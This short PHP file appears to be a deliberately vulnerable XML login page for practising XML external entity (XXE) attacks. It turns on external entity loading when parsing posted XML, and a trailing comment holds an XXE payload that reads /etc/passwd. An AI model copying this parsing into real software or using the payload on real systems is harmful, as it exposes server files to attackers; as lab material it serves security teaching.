<?php
	if (isset($_POST["xml"])) {
		$xml = @$_POST["xml"];
		libxml_disable_entity_loader(false);
		$document = new DOMDocument();
		$document->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);
		$user = simplexml_import_dom($document);
		$userName = $user->user;
		echo "You are logged in as user $userName";
		exit;
	}
?>
<form method="GET">
	<textarea name="xml"></textarea>
	<input type="submit" />
</form>
<?php
/*
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
*/